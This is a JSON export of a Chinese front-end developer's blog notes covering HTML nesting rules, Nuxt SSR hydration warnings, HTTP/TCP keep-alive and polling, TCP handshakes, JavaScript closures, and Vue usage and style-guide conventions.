{"meta":{"title":"shylees' Blog","subtitle":"低头往前走就好了","description":"前端学习笔记","author":"shylees","url":"https://shylees.github.io","root":"/"},"pages":[],"posts":[{"title":"html 标签嵌套规则","slug":"work/10 xhtml 标签嵌套规则","date":"2022-04-23T08:28:48.565Z","updated":"2022-05-06T05:46:38.142Z","comments":false,"path":"workNotes/work/10 xhtml 标签嵌套规则","link":"workNotes/work/10 xhtml 标签嵌套规则","permalink":"https://shylees.github.io/workNotes/work/10%20xhtml%20%E6%A0%87%E7%AD%BE%E5%B5%8C%E5%A5%97%E8%A7%84%E5%88%99","excerpt":"","text":"由 [nuxtjs 开发 spa](./10 nuxtjs 报错.md) 引申出的思考 参考链接： https://cloud.tencent.com/developer/article/1009200 https://cloud.tencent.com/developer/article/1484900 https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/Content_categories 其实第一个参考链接的图片已经讲的很清楚了，那我就大概总结一下吧 块级元素可以嵌套 块级/行内元素 其中 &lt;h1&gt;～&lt;h6&gt; &lt;dt&gt; 只能嵌套行内元素 其中 &lt;p&gt; 可以嵌套 &lt;p&gt; 和 行内元素 行内元素 只可以嵌套行内元素 其中 &lt;a&gt; 可以嵌套除了 &lt;a&gt; 以外的几乎所有元素，包括行内和块级元素 块级元素 与 块级元素 并列，行内元素 与 行内元素 并列 在使用 nuxtjs 配合 vue 开发的时候，报 [vue warn]的情况，只有 &lt;a&gt; &lt;a&gt;&lt;/a&gt; &lt;/a&gt;，及 a 标签 嵌套 a 标签才会出现，为啥捏？还没有搞懂…","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"html","slug":"html","permalink":"https://shylees.github.io/tags/html/"}]},{"title":"nuxtjs 开发 spa 遇上的有关 html 标签规则的报错","slug":"work/10 nuxtjs报错","date":"2022-04-20T13:51:19.513Z","updated":"2022-04-21T05:26:20.978Z","comments":false,"path":"workNotes/work/10 nuxtjs报错","link":"workNotes/work/10 nuxtjs报错","permalink":"https://shylees.github.io/workNotes/work/10%20nuxtjs%E6%8A%A5%E9%94%99","excerpt":"","text":"博客上线前，老大发现的 [vue warn], 说 “博客详情服务器渲染有问题”、“这个在正式环境会执行错误的”、“沙盒应该就会无法渲染”、“ssr 和 spa 渲染结果不一样”… 触发报错的操作: “在博客详情页直接刷新 就会提示我截图的错误” 报错信息: [Vue warn]: The client-side rendered virtual DOM tree is not matching server-rendered content. This is likely caused by incorrect HTML markup, for example nesting block-level elements inside &lt;p&gt;, or missing &lt;tbody&gt;. Bailing hydration and performing full client-side render. 报错截图： 大概意思是 HTML 结构嵌套不正确，会导致 srr 渲染的页面跟csr的不一样 根据黄色提示，我很快就定位到了代码的位置 报错效果图及其 html 标签: 最外层的&lt;a class=&quot;pre item&quot;&gt; 本来最外层的 &lt;a&gt; 是 &lt;p&gt; 的，但是因为里面的两个 &lt;a&gt; 标签都是跳转同一个链接，所以我就直接把最外层改了，虽然我记得这样嵌套不行，但是我以为没影响！ 我不知道为什么上个同学要分开写两个? 难道是因为分开 hover 改变样式? 如果有大佬知道分开写的好处, d 我!!! 我很感兴趣!!! 报错解决 因为 html 标签嵌套规则里面有提到 &lt;a&gt; 标签可以嵌套除本身以外的块级元素、行内元素，所以直接把里面的两个 &lt;a&gt; 改成其他标签，如 &lt;span&gt; 就解决问题啦！","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"ssr","slug":"ssr","permalink":"https://shylees.github.io/tags/ssr/"},{"name":"nuxtjs","slug":"nuxtjs","permalink":"https://shylees.github.io/tags/nuxtjs/"}]},{"title":"http 与 tcp keep-alive 的区别","slug":"further/01 http tcp keepalive","date":"2022-03-26T16:00:00.000Z","updated":"2022-03-26T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 http tcp keepalive","link":"furtherNotes/further/01 http tcp keepalive","permalink":"https://shylees.github.io/furtherNotes/further/01%20http%20tcp%20keepalive","excerpt":"","text":"根据 连接轮询扩展 参考链接: https://www.jianshu.com/p/95af6727bf6c https://www.jianshu.com/p/cb36364ee099 – 详细 HTTP keep-alive 决定tcp连接是长连接还是短连接 HTTP是基于TCP传输协议实现的，客户端与服务段要进行HTTP连接前，需要先建立TCP连接，然后客户端发送HTTP请求，服务端收到后就返回响应，至此[请求-应答]完成，随后释放连接。 HTTP短连接：每次请求都经历一个建立TCP的连接。一次连接只能请求一次资源。 HTTP长连接：HTTP的keepalive实现了这个功能，可以使用同一个TCP连接来发送和接受多个HTTP请求/应答，避免连接建立释放的过程造成的资源消耗 特点：只要任意一端没有明确提出断开连接，则保持TCP连接。 为了避免资源浪费的情况，web服务器会提供超时连接的参数，用来指定HTTP长连接的超时时间。 TCP keep-alive 是由TCP内核层实现的，称为TCP的保活机制 定义在一个时间段，在这个时间段内，如果没有任何连接的相关活动，TCP保活机制会开始作用 —— 每隔一个时间段，发送一个探测报文，该探测报文包含的数据非常少，如果连续几个探测报文都没有得到响应，则认为当前的TCP连接已经死亡，系统内核将错误信息通知上层应用程序。 如果对端程序是正常工作的。当TCP保活的探测报文发送给对端，对端会正常响应，这样TCP保活时间会被重置，等待下一个TCP保活时间的到来。 如果对端程序崩溃，或对端由于其他原因导致报文不可达。当TCP保活的探测报文发送给对端后，石沉大海，没有响应，连续几次，达到保活探测次数后，TCP会报告该TCP连接已死亡。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"长连接短链接 长轮询短轮询","slug":"further/01 tcp长短连接轮询","date":"2022-03-26T16:00:00.000Z","updated":"2022-03-26T16:00:00.000Z","comments":false,"path":"furtherNotes/further/01 tcp长短连接轮询","link":"furtherNotes/further/01 tcp长短连接轮询","permalink":"https://shylees.github.io/furtherNotes/further/01%20tcp%E9%95%BF%E7%9F%AD%E8%BF%9E%E6%8E%A5%E8%BD%AE%E8%AF%A2","excerpt":"","text":"参考链接：https://www.jianshu.com/p/3fc3646fad80 短链接 http1.0 每次http连接都要经历：发送请求 -&gt; 建立tcp连接 -&gt; 传输数据 -&gt; 关闭tcp连接 长连接 http1.1 http connection = keep-alive，发送请求 -&gt; 建立tcp长连接 -&gt; 传输所有http请求及其响应数据 -&gt; 在超时时间内 如果没有请求发送的话就断开连接 HTTP协议说到底是应用层的协议，而TCP才是真正的传输层协议，只有负责传输的这一层才需要建立连接。 所以长短连接是指 tcp 连接 Q1 是不是只要设置Connection为keep-alive就算是长连接了？ A1 是的，但要服务器和客户端都设置。 都说HTTP1.1默认是长连接，而观察我们平时开发的Web应用的HTTP头部，Connection也确实是keep-alive，那就是说我们大部分都是用的长连接 Q2 我们平时用的是不是长连接？ A2 是的。（现在用的基本上都是HTTP1.1协议，你观察一下就会发现，基本上Connection都是keep-alive。而且HTTP协议文档上也提到了，HTTP1.1默认是长连接，也就是默认Connection的值就是keep-alive） Q3 这种普通的Web应用（比如博客园，我的个人博客这种）用长连接有什么好处？需不需要关掉长连接而使用短连接？ A3 长连接是为了复用TCP连接，也就是说，长连接情况下，多个HTTP请求可以复用同一个TCP连接，这就节省了很多TCP连接建立和断开的消耗。 比如你请求了博客园的一个网页，这个网页里肯定还包含了CSS、JS等等一系列资源，如果你是短连接（也就是每次都要重新建立TCP连接）的话，那你每打开一个网页，基本要建立几个甚至几十个TCP连接，这浪费了多少资源就不用LZ去说了吧。 但如果是长连接的话，那么这么多次HTTP请求（这些请求包括请求网页内容，CSS文件，JS文件，图片等等），其实使用的都是一个TCP连接，很显然是可以节省很多消耗的。 长连接并不是永久连接的。如果一段时间内（具体的时间长短，是可以在header当中进行设置的，也就是所谓的超时时间），这个连接没有HTTP请求发出的话，那么这个长连接就会被断掉。 首先长连接是为了复用，比如说在请求这个博客的时候，建立了一条tcp连接，在传输完一个html文件后，连接就关闭了，如果还有后续的css文件就需要再开启一个tcp连接，but 如果用了长连接，再与改网站有关的资源还没传输完的时候一直保持着改连接， 短轮询 在一个需要实时更新数据的地方，比如说商品库存量: 用JS写个死循环，不停的去请求服务器中的库存量是多少，然后刷新到这个页面当中，这其实就是所谓的短轮询。短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。 坏处：那就是你很浪费服务器和客户端的资源，如果有1000个人停留在某个商品详情页面，那就是说会有1000个客户端不停的去请求服务器获取库存量，这显然是不合理的。 短轮询就是在不停得向后端发送请求查询库存量，后端每次都返回当前数据库的值给前端 如果在很多用户都看这个页面时，后台就要返回很多数据 长轮询 在一个需要实时更新数据的地方，比如说商品库存量: 其实长轮询和短轮询最大的区别是，短轮询去服务端查询的时候，不管库存量有没有变化，服务器就立即返回结果了。而长轮询则不是，在长轮询中**，服务器如果检测到库存量没有变化的话，将会把当前请求挂起一段时间（这个时间也叫作超时时间**，一般是几十秒）。在这个时间里，服务器会去检测库存量有没有变化，检测到变化就立即返回，否则就一直等到超时为止。 长轮询就是发送一个查询库存量的请求，但是后端是在数据库变化的时候才返回给前端 轮询和连接的区别 决定的方式， 一个TCP连接是否为长连接，是通过设置HTTP的Connection Header来决定的，而且是需要两边都设置才有效。 而一种轮询方式是否为长轮询，是根据服务端的处理方式来决定的，与客户端没有关系。 实现的方式， 连接的长短是通过协议来规定和实现的。 而轮询的长短，是服务器通过编程的方式手动挂起请求来实现的。","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"tcp三次握手、四次挥手","slug":"further/02 tcp三次握手四次挥手","date":"2022-03-26T16:00:00.000Z","updated":"2022-03-26T16:00:00.000Z","comments":false,"path":"furtherNotes/further/02 tcp三次握手四次挥手","link":"furtherNotes/further/02 tcp三次握手四次挥手","permalink":"https://shylees.github.io/furtherNotes/further/02%20tcp%E4%B8%89%E6%AC%A1%E6%8F%A1%E6%89%8B%E5%9B%9B%E6%AC%A1%E6%8C%A5%E6%89%8B","excerpt":"","text":"参考链接： https://juejin.cn/post/6844904070889603085#heading-1 https://juejin.cn/post/6844903625513238541 三次握手 为什么要进行三次握手：为了确认对方的发送和接收能力。 主要流程： 为什么不是两次？ 根本原因: 无法确认客户端的接收能力。 如果是两次，你现在发了 SYN 报文想握手，但是这个包滞留在了当前的网络中迟迟没有到达，TCP 以为这是丢了包，于是重传，两次握手建立好了连接。 看似没有问题，但是连接关闭后，如果这个滞留在网路中的包到达了服务端呢？这时候由于是两次握手，服务端只要接收到然后发送相应的数据包，就默认建立连接，但是现在客户端已经断开了。 为什么不是四次？ 三次握手的目的是确认双方发送和接收的能力，那四次握手可以嘛？ 当然可以，100 次都可以。但为了解决问题，三次就足够了，再多用处就不大了。 三次握手过程中可以携带数据么？ 第三次握手的时候，可以携带。前两次握手不能携带数据。 如果前两次握手能够携带数据，那么一旦有人想攻击服务器，那么他只需要在第一次握手中的 SYN 报文中放大量数据，那么服务器势必会消耗更多的时间和内存空间去处理这些数据，增大了服务器被攻击的风险。 第三次握手的时候，客户端已经处于ESTABLISHED状态，并且已经能够确认服务器的接收、发送能力正常，这个时候相对安全了，可以携带数据。 同时打开会怎样？ 如果双方同时发 SYN报文，状态变化会是怎样的呢？ 在发送方给接收方发SYN报文的同时，接收方也给发送方发SYN报文，两个人刚上了! 发完SYN，两者的状态都变为SYN-SENT。 在各自收到对方的SYN后，两者状态都变为SYN-REVD。 接着会回复对应的ACK + SYN，这个报文在对方接收之后，两者状态一起变为ESTABLISHED。 这就是同时打开情况下的状态变迁。 四次挥手 等待2MSL的意义 如果不等待，客户端直接跑路，当服务端还有很多数据包要给客户端发，且还在路上的时候，若客户端的端口此时刚好被新的应用占用，那么就接收到了无用数据包，造成数据包混乱。所以，最保险的做法是等服务器发来的数据包都死翘翘再启动新的应用。 1 个 MSL 确保四次挥手中主动关闭方最后的 ACK 报文最终能达到对端 1 个 MSL 确保对端没有收到 ACK 重传的 FIN 报文可以到达 这就是等待 2MSL 的意义。 为什么是四次挥手而不是三次？ 因为服务端在接收到FIN, 往往不会立即返回FIN, 必须等到服务端所有的报文都发送完毕了，才能发FIN。因此先发一个ACK表示已经收到客户端的FIN，延迟一段时间才发FIN。这就造成了四次挥手。 如果是三次挥手会有什么问题？ 等于说服务端将ACK和FIN的发送合并为一次挥手，这个时候长时间的延迟可能会导致客户端误以为FIN没有到达客户端，从而让客户端不断的重发FIN 同时关闭会怎样？","categories":[{"name":"furtherNotes","slug":"furtherNotes","permalink":"https://shylees.github.io/categories/furtherNotes/"}],"tags":[{"name":"网络","slug":"网络","permalink":"https://shylees.github.io/tags/%E7%BD%91%E7%BB%9C/"}]},{"title":"浅浅了解闭包","slug":"work/09 闭包","date":"2022-03-02T03:49:00.000Z","updated":"2022-03-02T06:03:00.000Z","comments":false,"path":"workNotes/work/09 闭包","link":"workNotes/work/09 闭包","permalink":"https://shylees.github.io/workNotes/work/09%20%E9%97%AD%E5%8C%85","excerpt":"","text":"2022.03.02 周三 参考链接：https://github.com/lgwebdream/FE-Interview/issues/17 对闭包的看法，为什么要用闭包？说一下闭包原理以及应用场景 闭包是什么？ 函数执行后返回结果是一个内部函数，并被外部变量所引用，如果内部函数持有被执行函数作用域的变量，就形成了闭包。 简而言之：可以在内部函数访问到外部函数的作用域。 使用闭包的作用： 读取函数中的变量 将函数中的变量存储在内存中，保护变量不被污染。 因此，会对内存有消耗，所以不可以滥用闭包，否则会影响网页性能，造成内存泄漏。 在不需要使用闭包时，要及时释放内存，可以将内层函数对象的变量赋值为 null 闭包原理 函数执行分成两个阶段：预编译阶段 和 执行阶段 预编译阶段，如果发现内部函数使用了外部函数的变量，则会在内存中创建一个“闭包”对象并保存对应变量，如果已存在“闭包”，就只需要增加对应的属性值即可。 执行完后，函数执行上下文会被销毁，函数对“闭包”对象的引用也会被销毁，但内部函数还持有该“闭包”的引用，所以内部函数可以继续使用外部函数中的变量 利用函数作用域链的特性，一个函数内部定义的函数 会将包含的 外部函数的活动对象 添加到它的作用域中，函数执行完毕，其函数执行作用域链销毁；但因为 内部函数的作用域链 仍然在引用这个活动对象，所以其活动对象不会被销毁，直至内部函数被销毁后才被销毁。 优点 可以从内部函数访问外部函数的作用域中的变量，且访问到的变量长期存储在内存中，可供后面使用 避免变量污染全局 把变量存在独立的作用域，作为私有成员存在 缺点 对内存消耗有负面影响，因内部函数保存了对外部变量的引用，导致无法被垃圾回收，增大内存使用量，所以使用不当会导致内存泄漏。 对处理速度具有负面影响。闭包的层级决定了引用的外部变量在查找时经过的作用域链的长度 可能获取到意外的值 captured value 应用场景 模块封装；在各模块规范出现之前，都是用这样的方式防止变量污染全局 12345678var bar = function () &#123; var foo = 0; function bar() &#123;&#125; bar.prototype.ddd = function ddd() &#123; return foo; &#125;; return bar;&#125;; 在循环中创建闭包，防止取到意外的值 123456789function foo(num)&#123; return function()&#123; console.log(num); &#125;&#125;for(var i = 0 ; i &lt; 3 ; i++&gt;)&#123; foo(i);&#125;","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"js","slug":"js","permalink":"https://shylees.github.io/tags/js/"},{"name":"闭包","slug":"闭包","permalink":"https://shylees.github.io/tags/%E9%97%AD%E5%8C%85/"}]},{"title":"关于 v-html 内样式不生效","slug":"work/07 v-html 样式不生效","date":"2022-02-24T03:53:00.000Z","updated":"2022-02-25T05:53:00.000Z","comments":false,"path":"workNotes/work/07 v-html 样式不生效","link":"workNotes/work/07 v-html 样式不生效","permalink":"https://shylees.github.io/workNotes/work/07%20v-html%20%E6%A0%B7%E5%BC%8F%E4%B8%8D%E7%94%9F%E6%95%88","excerpt":"","text":"free-vpn 读取$t 里面的内容 作为 html 其中有个 a 标签有其他样式 参考链接 https://cloud.tencent.com/developer/article/1485232 关于 v-html 在 vue 使用中，指令 v-html 渲染页面经常用到，类似于 jQuery 的$(‘x’).html( )去渲染。通过指令 v-html 渲染出来的内容还会带有原来的标签及其样式，如果需要修改或者重设其样式，应该如何去做呢？ 采坑 首先，我在 style 中用子级选择器去选中并修改样式，经过猛如虎的操作后，并没生效。F12 打开 Elements 调试，发现在 style 里面样式根本没加载上去，没有 class 中也没有类名出现。除此之外，渲染非该指令元素时，所有的类名会跟有 [data-v-xxxxxx]的东西。 排坑 去掉 style 中的 scoped; watch 监测数据变化; 深度选择器 &gt;&gt;&gt; 在 vue 组件中，我们写 style 时，为了防止页面样式冲突，在每个组件中会加上 scoped 属性。经测试，去掉该属性即可渲染样式成功。但是在组件过多或者项目中大时，经常会出现页面样式冲突，因此该方法不建议使用。 在 script&gt;exportdefault 中,watch 属性可监听 v-html 所绑定值的变化。如果是后台请求的数据，那么可以在 watch 中监听改数据变化，当数据发生改变驱动视图后，动态绑定一个 class 来改变子级元素样式。此方法有一定局限性。 深度选择器 &gt;&gt;&gt;，可深度改变子级样式 123456789101112131415&lt;style scoped&gt; .test &gt;&gt;&gt; * &#123; width: 100%; &#125;&lt;/style&gt;&lt;!-- 如果使用 scss或者 less等css扩展语言，则用 /deep/替代 --&gt;&lt;style scoped type=&quot;text/scss&quot; lang=&quot;scss&quot;&gt; .test &#123; /deep/ * &#123; width: 100%; &#125; &#125;&lt;/style&gt; scoped 属性导致 css 仅对当前组件生效，而 html 绑定渲染出的内容可以理解为是子组件的内容，一般情况下子组件不会被加上对应的属性，所以不会应用带有 scoped 的 css。","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"vue 一些注意的问题","slug":"work/06 vue 问题","date":"2022-02-21T09:40:00.000Z","updated":"2022-02-21T11:04:00.000Z","comments":false,"path":"workNotes/work/06 vue 问题","link":"workNotes/work/06 vue 问题","permalink":"https://shylees.github.io/workNotes/work/06%20vue%20%E9%97%AE%E9%A2%98","excerpt":"","text":"vue 一些注意的问题 参考 官方文档 v-if 与 v-show v-if 是“真正”的条件渲染，因为它会确保在切换过程中条件块内的事件监听器和子组件适当地被销毁和重建。 v-if 也是惰性的：如果在初始渲染时条件为假，则什么也不做——直到条件第一次变为真时，才会开始渲染条件块。 相比之下，v-show 就简单得多——不管初始条件是什么，元素总是会被渲染，并且只是简单地基于 CSS 进行切换。 一般来说，v-if 有更高的切换开销，而 v-show 有更高的初始渲染开销。因此，如果需要非常频繁地切换，则使用 v-show 较好；如果在运行时条件很少改变，则使用 v-if 较好。 避免 v-if 与 v-for 一起使用 v-for 优先级比 v-if 高，多了不必要的开销 v-for 中的 in 可以被 of 替代，它更接近 JavaScript 迭代器的语法； v-for 中的参数依次为(item, keyname, value); 不要使用对象或数组之类的非基本类型值作为 v-for 的 key。请用字符串或数值类型的值。 数组更新检测 Vue 将被侦听的数组的变更方法进行了包裹，所以它们也将会触发视图更新。这些被包裹过的方法包括： push() pop() shift() unshift() splice() sort() reverse() @click=“handle($event)” 在内联语句处理器中访问原始的 DOM 事件 v-model 1234567&lt;input v-model=&quot;searchText&quot;&gt;&lt;!-- 等价于 --&gt;&lt;input v-bind:value=&quot;searchText&quot; v-on:input=&quot;searchText = $event.target.value&quot;&gt; v-model 在内部为不同的输入元素使用不同的 property 并抛出不同的事件： + text 和 textarea 元素使用 value property 和 input 事件； + checkbox 和 radio 使用 checked property 和 change 事件； + select 字段将 value 作为 prop 并将 change 作为事件。 一个组件的data必须是 函数 一个组件的 data 选项必须是一个函数，因此每个实例可以维护一份被返回对象的独立的拷贝 注册组件 1234567891011121314151617181920// 全局注册Vue.component(&#x27;component-a&#x27;, &#123; /* ... */ &#125;)Vue.component(&#x27;component-b&#x27;, &#123; /* ... */ &#125;)Vue.component(&#x27;component-c&#x27;, &#123; /* ... */ &#125;)new Vue(&#123; el: &#x27;#app&#x27; &#125;)// 局部注册var ComponentA = &#123; /* ... */ &#125;var ComponentB = &#123; /* ... */ &#125;var ComponentC = &#123; /* ... */ &#125;new Vue(&#123; el: &#x27;#app&#x27;, components: &#123; &#x27;component-a&#x27;: ComponentA, &#x27;component-b&#x27;: ComponentB &#125;&#125;) prop 的写法 在js中:props:[postTitle]; 在html中:&lt;blog-post post-title=&quot;hello!&quot;&gt;&lt;/blog-post&gt; prop 可以通过 v-bind 动态赋值 1&lt;blog-post v-bind:title=&quot;post.title&quot;&gt;&lt;/blog-post&gt; 单项数据流 所有的 prop 都使得其父子 prop 之间形成了一个单向下行绑定：父级 prop 的更新会向下流动到子组件中，但是反过来则不行。这样会防止从子组件意外变更父级组件的状态，从而导致你的应用的数据流向难以理解。 额外的，每次父级组件发生变更时，子组件中所有的 prop 都将会刷新为最新的值。这意味着你不应该在一个子组件内部改变 prop。如果你这样做了，Vue 会在浏览器的控制台中发出警告。","categories":[{"name":"workNotes","slug":"workNotes","permalink":"https://shylees.github.io/categories/workNotes/"}],"tags":[{"name":"vue","slug":"vue","permalink":"https://shylees.github.io/tags/vue/"}]},{"title":"vue风格指南","slug":"work/05 vue 风格指南","date":"2022-02-21T08:42:00.000Z","updated":"2022-02-21T09:37:00.000Z","comments":false,"path":"workNotes/work/05 vue 风格指南","link":"workNotes/work/05 vue 风格指南","permalink":"https://shylees.github.io/workNotes/work/05%20vue%20%E9%A3%8E%E6%A0%BC%E6%8C%87%E5%8D%97","excerpt":"","text":"优先级A 组件名为多个单词 这样做可以避免跟现有的以及未来的 HTML 元素相冲突，因为所有的 HTML 元素名称都是单个单词的。 组件数据必为函数 当在组件中使用 data property 的时候 (除了 new Vue 外的任何地方)，它的值必须是返回一个对象的函数。 当 data 的值是一个对象时，它会在这个组件的所有实例之间共享。当组件被重用时，因为每个组件的实例都引用了相同的数据对象，更改其中一个对象就是改变到其他使用到该组件的数据 我们希望每个组件实例都管理其自己的数据。为了做到这一点，每个实例必须生成一个独立的数据对象。在 JavaScript 中，在一个函数中返回这个对象就可以了。 prop 定义应该尽量详细 至少要指定数据类型 细致的 prop 定义有两个好处： 它们写明了组件的 API，所以很容易看懂组件的用法； 在开发环境下，如果向一个组件提供格式不正确的 prop，Vue 将会告警，以帮助你捕获潜在的错误来源。 v-for 设置 key 以便维护内部组件及其子树的状态。 避免 v-if 和 v-for 一起使用 当 Vue 处理指令时，v-for 比 v-if 具有更高的优先级。 所以当用在一个元素的时候，会先把所有元素遍历渲染出来，在看v-if哪些是不用渲染的 为组件样式设置作用域 顶级 App 组件和布局组件中的样式可以是全局的，但是其它所有组件都应该是有作用域的 这条规则只和单文件组件有关。你不一定要使用 scoped attribute。设置作用域也可以通过 CSS Modules，那是一个基于 class 的类似 BEM 的策略，当然你也可以使用其它的库或约定。 不管怎样，对于组件库，我们应该更倾向于选用基于 class 的策略而不是 scoped attribute。 这让覆写内部样式更容易：使用了常人可理解的 class 名称且没有太高的选择器优先级，而且不太会导致冲突。 Vue 使用 _ 前缀来定义其自身的私有 property，所以使用相同的前缀 (比如 update) 有覆写实例 property 的风险。即便你检查确认 Vue 当前版本没有用到这个 property 名，也不能保证和将来的版本没有冲突。 对于 $ 前缀来说，其在 Vue 生态系统中的目的是暴露给用户的一个特殊的实例 property，所以把它用于私有 property 并不合适。 不过，我们推荐把这两个前缀结合为 $，作为一个用户定义的私有 property 的约定，以确保不会和 Vue 自身相冲突。 优先级B 组件文件 单文件组件文件名称 单文件组件的文件名应该要么始终是单词大写开头 (PascalCase)，要么始终是横线连接 (kebab-case)。 单词大写开头对于代码编辑器的自动补全最为友好，因为这使得我们在 JS(X) 和模板中引用组件的方式尽可能的一致。然而，混用文件命名方式有的时候会导致大小写不敏感的文件系统的问题，这也是横线连接命名同样完全可取的原因。 基础组件名 应用特定样式和约定的基础组件 (也就是展示类的、无逻辑的或无状态的组件) 应该全部以一个特定的前缀开头，比如 Base、App 或 V 单例组件名 The 只应该拥有单个活跃实例的组件应该以 The 前缀命名，以示其唯一性 这不意味着组件只可用于一个单页面，而是每个页面只使用一次。这些组件永远不接受任何 prop，因为它们是为你的应用定制的，而不是它们在你的应用中的上下文。如果你发现有必要添加 prop，那就表明这实际上是一个可复用的组件，只是目前在每个页面里只使用一次。 紧密耦合的组件名 和父组件紧密耦合的子组件应该以父组件名作为前缀命名 自闭合组件 组件名中的单词顺序在单文件组件、字符串模板和 JSX 中没有内容的组件应该是自闭合的——但在 DOM 模板里永远不要这样做。 自闭合组件表示它们不仅没有内容，而且刻意没有内容。其不同之处就好像书上的一页白纸对比贴有“本页有意留白”标签的白纸。而且没有了额外的闭合标签，你的代码也更简洁。 不幸的是，HTML 并不支持自闭合的自定义元素——只有官方的“空”元素。所以上述策略仅适用于进入 DOM 之前 Vue 的模板编译器能够触达的地方，然后再产出符合 DOM 规范的 HTML。 组件名应该以高级别的 (通常是一般化描述的) 单词开头，以描述性的修饰词结尾。 1234&lt;!-- 在单文件组件、字符串模板和 JSX 中 --&gt;&lt;MyComponent/&gt;&lt;!-- 在 DOM 模板中 --&gt;&lt;my-component&gt;&lt;/my-component&gt; 模版中的组件名大小写 对于绝大多数项目来说，在单文件组件和字符串模板中组件名应该总是 PascalCase 的——但是在 DOM 模板中总是 kebab-case 的。 PascalCase 相比 kebab-case 有一些优势： 编辑器可以在模板里自动补全组件名，因为 PascalCase 同样适用于 JavaScript。 &lt;MyComponent&gt; 视觉上比 &lt;my-component&gt; 更能够和单个单词的 HTML 元素区别开来，因为前者的不同之处有两个大写字母，后者只有一个横线。 如果你在模板中使用任何非 Vue 的自定义元素，比如一个 Web Component，PascalCase 确保了你的 Vue 组件在视觉上仍然是易识别的。 不幸的是，由于 HTML 是大小写不敏感的，在 DOM 模板中必须仍使用 kebab-case。 1234567&lt;!-- 在单文件组件和字符串模板中 --&gt;&lt;MyComponent/&gt;&lt;!-- 在 DOM 模板中 --&gt;&lt;my-component&gt;&lt;/my-component&gt;&lt;!-- or 在所有地方 --&gt;&lt;my-component&gt;&lt;/my-component&gt; js/jsx 中组件名大小写 JS/JSX 中的组件名应该始终是 PascalCase 的，尽管在较为简单的应用中只使用 Vue.component 进行全局组件注册时，可以使用 kebab-case 字符串。 1234567891011Vue.component(&#x27;MyComponent&#x27;, &#123; // ...&#125;)Vue.component(&#x27;my-component&#x27;, &#123; // ...&#125;)import MyComponent from &#x27;./MyComponent.vue&#x27;export default &#123; name: &#x27;MyComponent&#x27;, // ...&#125; 完整单词组件名 组件名应该倾向于完整单词而不是缩写。 编辑器中的自动补全已经让书写长命名的代价非常之低了，而其带来的明确性却是非常宝贵的。不常用的缩写尤其应该避免。 prop名 大小写 在声明 prop 的时候，其命名应该始终使用 camelCase，而在模板和 JSX 中应该始终使用 kebab-case。 我们单纯的遵循每个语言的约定。在 JavaScript 中更自然的是 camelCase。而在 HTML 中则是 kebab-case。 多 attr 元素 多个 attribute 的元素应该分多行撰写，每个 attribute 一行。 在 JavaScript 中，用多行分隔对象的多个 property 是很常见的最佳实践，因为这样更易读。模板和 JSX 值得我们做相同的考虑。 模版中简单表达式 组件模板应该只包含简单的表达式，复杂的表达式则应该重构为计算属性或方法。 复杂表达式会让你的模板变得不那么声明式。我们应该尽量描述应该出现的是什么，而非如何计算那个值。而且计算属性和方法使得代码可以重用。 简单计算属性 应该把复杂计算属性分割为尽可能多的更简单的 property。 易于测试、易于阅读、更好的“拥抱变化” 带引号的 attr 值 非空 HTML attribute 值应该始终带引号 (单引号或双引号，选你 JS 里不用的那个)。 在 HTML 中不带空格的 attribute 值是可以没有引号的，但这鼓励了大家在特征值里不写空格，导致可读性变差。 指令缩写 指令缩写 (用 : 表示 v-bind:、用 @ 表示 v-on: 和用 # 表示 v-slot:) 应该要么都用要么都不用。 优先级 C 组件/实例的选项顺序 推荐 副作用 - 触发组件外的影响 el 全局感知 - 要求组件外的知识 name parent 组件类型 - 更改组件类型 functional 模版修改器 - 改变模版的编译方式 delimiters comments 模版依赖 - 模版内使用的资源 components directives filters 组合 - 向选项里合并 property extends mixins 接口 - 组件接口 inheritAttrs model props/propsData 本地状态 - 本地响应式 property data computed 事件 - 通过响应式事件触发的回调函数 watch 生命周期钩子 非响应式的 property - 不依赖响应式系统的 property methods 渲染 - 组件输出声明描述 template/render renderError 元素 attr 顺序 定义 - 提供组件的选项 is 列表渲染 v-for 条件渲染 v-if v-else-if v-else v-show v-cloak 渲染方式 v-pre v-once 全局感知 - 需要超越组件的知识 id 唯一的attr ref key 双向绑定 v-model 其他 attr - 所有普通的绑定或未绑定的 attr 事件 v-on 内容 v-html v-text 组件/实例选项中的空行 你可能想在多个 property 之间增加一个空行，特别是在这些选项一屏放不下，需要滚动才能都看到的时候。 当你的组件开始觉得密集或难以阅读时，在多个 property 之间添加空行可以让其变得容易。在一些诸如 Vim 的编辑器里，这样格式化后的选项还能通过键盘被快速导航。 单文件组件的顶级元素的顺序 单文件组件应该总是让 &lt;script&gt;、&lt;template&gt; 和 &lt;style&gt; 标签的顺序保持一致。且 &lt;style&gt; 要放在最后，因为另外两个标签至少要有一个。 优先级D 谨慎使用 不在 v-if/v-else-if/v-else ➕ key 如果一组 v-if + v-else 的元素类型相同，最好使用 key (比如两个 元素)。 默认情况下，Vue 会尽可能高效的更新 DOM。这意味着其在相同类型的元素之间切换时，会修补已存在的元素，而不是将旧的元素移除然后在同一位置添加一个新元素。如果本不相同的元素被识别为相同，则会出现意料之外的结果。 scoped 避免出现元素选择器 在 scoped 样式中，类选择器比元素选择器更好，因为大量使用元素选择器是很慢的。 隐性父子组件通信 应该优先通过 prop 和事件进行父子组件之间的通信，而不是 this.$parent 或变更 prop。 一个理想的 Vue 应用是 prop 